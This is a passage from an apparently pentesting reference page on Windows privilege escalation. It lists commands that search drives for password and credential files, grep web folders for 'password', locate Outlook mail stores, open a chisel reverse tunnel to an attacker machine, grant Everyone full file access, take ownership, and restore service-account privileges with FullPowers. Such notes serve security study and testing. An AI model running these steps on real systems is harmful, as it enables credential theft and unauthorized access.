</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">*</span><span class="n">pass</span><span class="p">*</span> <span class="p">==</span> <span class="p">*</span><span class="n">cred</span><span class="p">*</span> <span class="p">==</span> <span class="p">*</span><span class="n">vnc</span><span class="p">*</span> <span class="p">==</span> <span class="p">*.</span><span class="n">config</span><span class="p">*</span>
</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="c"># /q: Displays the ownership information.</span>
</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="nb">dir </span><span class="p">/</span><span class="n">q</span> <span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>
</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="c"># Hidden files</span>
</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="nb">dir </span><span class="p">/</span><span class="n">a</span><span class="p">:</span><span class="nb">h </span><span class="p">.\</span>
</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a>
</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="c"># Website folder</span>
</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="nb">dir </span><span class="n">c</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span>
</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>
</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a><span class="c"># SQL server</span>
</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a><span class="nb">dir </span><span class="n">c</span><span class="p">:\</span><span class="n">SQLServer</span><span class="p">\</span><span class="n">Logs</span>
</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a><span class="nb">type </span><span class="n">c</span><span class="p">:\</span><span class="n">SQLServer</span><span class="p">\</span><span class="n">Logs</span><span class="p">\</span><span class="n">ERRORLOG</span><span class="p">.</span><span class="n">BAK</span>
</span><span id="__span-12-30"><a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a>
</span><span id="__span-12-31"><a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a><span class="c"># Get contents of file</span>
</span><span id="__span-12-32"><a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a><span class="n">more</span> <span class="p">.\</span><span class="n">example</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-12-33"><a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a><span class="nb">type </span><span class="p">.\</span><span class="n">example</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-12-34"><a id="__codelineno-12-34" name="__codelineno-12-34" href="#__codelineno-12-34"></a>
</span><span id="__span-12-35"><a id="__codelineno-12-35" name="__codelineno-12-35" href="#__codelineno-12-35"></a><span class="c"># Check Recycle.bin and SID Folder</span>
</span><span id="__span-12-36"><a id="__codelineno-12-36" name="__codelineno-12-36" href="#__codelineno-12-36"></a><span class="nb">dir </span><span class="n">-Force</span> <span class="p">\</span><span class="s1">&#39;$Recycle.Bin&#39;</span>
</span><span id="__span-12-37"><a id="__codelineno-12-37" name="__codelineno-12-37" href="#__codelineno-12-37"></a><span class="c"># -Recurse: List files recursively</span>
</span><span id="__span-12-38"><a id="__codelineno-12-38" name="__codelineno-12-38" href="#__codelineno-12-38"></a><span class="nb">dir </span><span class="n">-Force</span> <span class="n">-Recurse</span> <span class="p">\</span><span class="s1">&#39;$Recycle.Bin&#39;</span>
</span><span id="__span-12-39"><a id="__codelineno-12-39" name="__codelineno-12-39" href="#__codelineno-12-39"></a>
</span><span id="__span-12-40"><a id="__codelineno-12-40" name="__codelineno-12-40" href="#__codelineno-12-40"></a><span class="c"># ManageEngine (this service has many vulnerabilities)</span>
</span><span id="__span-12-41"><a id="__codelineno-12-41" name="__codelineno-12-41" href="#__codelineno-12-41"></a><span class="nb">dir </span><span class="n">-Force</span> <span class="p">\</span><span class="s1">&#39;Program Files (x86)&#39;</span><span class="p">\</span><span class="n">ManageEngine</span><span class="p">\</span>
</span></code></pre></div>
<h3 id="interesting-files">Interesting Files</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">c</span><span class="p">:\\</span> <span class="n">-Filter</span> <span class="s2">&quot;*.txt&quot;</span> <span class="n">-Recurse</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="c"># Directories</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">c</span><span class="p">:\\</span> <span class="n">-Directory</span> <span class="n">-Filter</span> <span class="s2">&quot;Example&quot;</span> <span class="n">-Recurse</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
</span></code></pre></div>
<h3 id="interesting-information-in-files">Interesting Information in Files</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">c</span><span class="p">:\</span><span class="n">inetpub</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;password&quot;</span>
</span></code></pre></div>
<h3 id="collect-emails">Collect Emails</h3>
<p>Reference: <a href="https://atomicredteam.io/collection/T1114.001/">Atomic Rea Team</a>  </p>
<p>We can collect the information about emails such as <strong>Outlook</strong> on the following directories.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">username</span><span class="p">&gt;\</span><span class="n">Documents</span><span class="p">\</span><span class="n">Outlook</span> <span class="n">Files</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">username</span><span class="p">&gt;\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Outlook</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="open-ports">Open Ports</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>netstat<span class="w"> </span>-a
</span></code></pre></div>
<p>If we found the listening ports, we need to port forwarding to access the port in local machine. <br />
For example, assume the port 8000 is listening. We can access to the target port 8000 by accessing to <code>http://localhost:8000</code> in local by executing the following command.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Remote (target) machine</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>chisel.exe<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.0.0.1:9999<span class="w"> </span>R:8000:127.0.0.1:8000
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># Local (attacker) machine</span>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>chisel<span class="w"> </span>server<span class="w"> </span>--reverse<span class="w"> </span>-p<span class="w"> </span><span class="m">9999</span>
</span></code></pre></div>
<p>Please refer to <a href="/exploit/network/port-forwarding/port-forwarding-with-chisel">this page</a> to check how to use Chisel for port forwarding.</p>
<p><br /></p>
<h2 id="getting-all-local-usersgroups">Getting All Local Users/Groups</h2>
<p>We can find all local users in <strong>Computer Management</strong> utility.
To open, enter <strong>"computer management"</strong> in search form at the bottom of the windows screen.</p>
<p>In Computer Management, click <strong>"Local Users and Groups"</strong>.</p>
<h3 id="enumerate-users">Enumerate Users</h3>
<ol>
<li>Click <strong>"Users"</strong>.</li>
<li>Double-click each user to get details e.g. <strong>"Member Of"</strong>.</li>
</ol>
<h3 id="enumerate-groups">Enumerate Groups</h3>
<ol>
<li>Click <strong>"Groups"</strong>.</li>
<li>Double-click each group.</li>
<li>Attempt to add new user in the group because we might be able to do that even if we are not an administrator.</li>
</ol>
<p><br /></p>
<h2 id="change-file-permission">Change File Permission</h2>
<ol>
<li>Right-click on the file.</li>
<li>Select the <strong>Properties</strong>.</li>
<li>Click the <strong>Security</strong> tab.</li>
<li>Click <strong>“Advanced”</strong>.</li>
<li>In the <strong>Permissions</strong> tab, click the <strong>“Add”</strong>.</li>
<li>Click <strong>“Select a principal”</strong>.</li>
<li>Enter the username in the text field.</li>
<li>Click <strong>OK</strong> and <strong>Apply</strong>.</li>
</ol>
<p>Also we can change permissions in CommandPrompt or PowerShell.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">icacls</span> <span class="s1">&#39;C:\Path\to\file&#39;</span> <span class="p">/</span><span class="n">grant</span> <span class="n">Users</span><span class="p">:</span><span class="n">F</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">icacls</span> <span class="s1">&#39;C:\Path\to\file&#39;</span> <span class="p">/</span><span class="n">grant</span> <span class="n">Everyone</span><span class="p">:</span><span class="n">F</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="take-ownership-of-a-file-administrators-group-required">Take Ownership of a File (Administrators Group Required)</h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c"># Check if the current user belongs to the Administrators group. </span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">net</span> <span class="n">user</span> <span class="n">USERNAME</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c"># Move to the directory containing the desired file</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="nb">cd </span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c"># Enable an administrator to recover access to a file.</span>
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="c"># /R: recursive operation</span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c"># /F: specify the filename</span>
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="n">takeown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">f</span> <span class="p">*.*</span>
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>
</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="c"># Modify dictionary access control lists on specified files</span>
</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a><span class="c"># /q: suppress success message</span>
</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a><span class="c"># /c: continue the operation despite any file errors</span>
</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a><span class="c"># /t: perform the operation on all specified files</span>
</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="c"># /grant: grant specified user access rights</span>
</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a><span class="n">icacls</span> <span class="s2">&quot;example.txt&quot;</span> <span class="p">/</span><span class="n">q</span> <span class="p">/</span><span class="n">c</span> <span class="p">/</span><span class="n">t</span> <span class="p">/</span><span class="n">grant</span> <span class="n">Users</span><span class="p">:</span><span class="n">F</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="all-privs-for-local-service-network-service-account">All Privs for Local Service, Network Service Account</h2>
<p>If we’re <code>Local Service</code> or <code>Network Service</code> account, it maybe possible to grant all privileges to the account.</p>
<p><a href="https://github.com/itm4n/FullPowers">FullPowers</a> is a powerful tool for doing that.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">FullPower</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c"># Confirm if the account has all privileges</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="event-logs">Event Logs</h2>
<ul>
<li><strong>Event Viewer</strong></li>
<li><strong>FullEventLogview</strong></li>
</ul>
<p><br /></p>
<h2 id="tasks">Tasks</h2>
<ul>
<li><strong>Task Schedular</strong></li>
</ul>
<p><br /></p>
<h2 id="sysinternals">Sysinternals</h2>
<p>Tools that offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Autoruns</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c1"># It shows what programs are configured to run during system bootup or login.</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>autoruns.exe
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="c1"># Process Explorer</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="c1"># A freeware task manager and system monitor.</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>procexp.exe
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>procexp64.exe
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="c1"># Process Monitor</span>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="c1"># It monitors and displays in real-time all file system activity.</span>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>procmon.exe
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>procmon64.exe
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="c1"># Strings</span>
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="c1"># It is same as the Linux “strings” command.</span>
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>strings.exe<span class="w"> </span>example.exe<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span><span class="s2">&quot;sometext&quot;</span>
</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>strings64.exe<span class="w"> </span>example.exe<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span><span class="s2">&quot;sometext&quot;</span>
</span></code></pre></div>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/privilege-escalation/windows privilege escalation.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>